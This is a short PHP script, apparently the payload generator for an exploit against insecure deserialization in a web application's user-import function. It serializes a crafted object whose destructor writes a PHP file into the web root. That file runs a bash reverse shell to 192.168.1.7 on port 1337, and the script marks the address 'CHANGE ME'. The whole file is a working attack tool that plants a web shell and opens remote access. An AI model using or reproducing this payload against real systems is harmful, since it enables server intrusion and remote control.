<?php
/**
 * @title Serialization Helper Script for exploitation of insecure deserialization in import user function `imprt_usr_insec_des_rce.py`
 * @usage `php genMalSerObj.php`
 */
class Log {
        public function __construct($f, $m) {
            $this->f = $f;
            $this->m = $m;
        }
        public function __destruct() {
            file_put_contents($this->f, $this->m, FILE_APPEND);
        }
    }

$usr_obj = new Log('/var/www/html/revshell.php', '<?php exec("bash -c \'bash -i >& /dev/tcp/192.168.1.7/1337 0>&1\'"); ?>'); // CHANGE ME
echo serialize($usr_obj);
?>
